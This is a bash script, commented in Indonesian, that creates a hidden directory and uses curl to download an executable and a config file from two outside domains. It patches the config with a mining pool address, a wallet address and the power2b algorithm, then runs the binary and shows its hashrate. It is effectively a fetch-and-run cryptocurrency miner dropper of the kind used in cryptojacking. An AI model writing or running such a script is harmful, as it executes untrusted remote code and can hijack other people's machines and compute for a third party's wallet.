#!/bin/bash

# Lokasi kerja
WORKDIR="$(pwd)/.meki"
mkdir -p "$WORKDIR"
cd "$WORKDIR" || { echo "Gagal masuk ke $WORKDIR"; exit 1; }

# URL file
URL_GENZO="https://blogspotgenzo.site/PANTE"
URL_CONFIG="http://genzoko.serveblog.net/config.json"

# Nama file
FILE_GENZO="PANTE"
FILE_CONFIG="config.json"

echo "[*] Download PANTE..."
curl -fsSL "$URL_GENZO" -o "$FILE_GENZO" || { echo "Gagal download PANTE"; exit 1; }

echo "[*] Download config.json..."
curl -fsSL "$URL_CONFIG" -o "$FILE_CONFIG" || { echo "Gagal download config.json"; exit 1; }

# Edit config.json sesuai pola
sed -i 's/"tua"/"43.157.91.13:8080"/g' "$FILE_CONFIG"
sed -i 's/"wulet"/"mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Qeri"/g' "$FILE_CONFIG"
sed -i 's/"meki"/"power2b"/g' "$FILE_CONFIG"

# Ubah jadi executable
chmod +x "$FILE_GENZO" 2>/dev/null

echo "[*] Menjalankan PANTE (hashrate akan tampil di bawah)..."
echo ""

# Jalankan langsung
./"$FILE_GENZO" -c "$FILE_CONFIG"
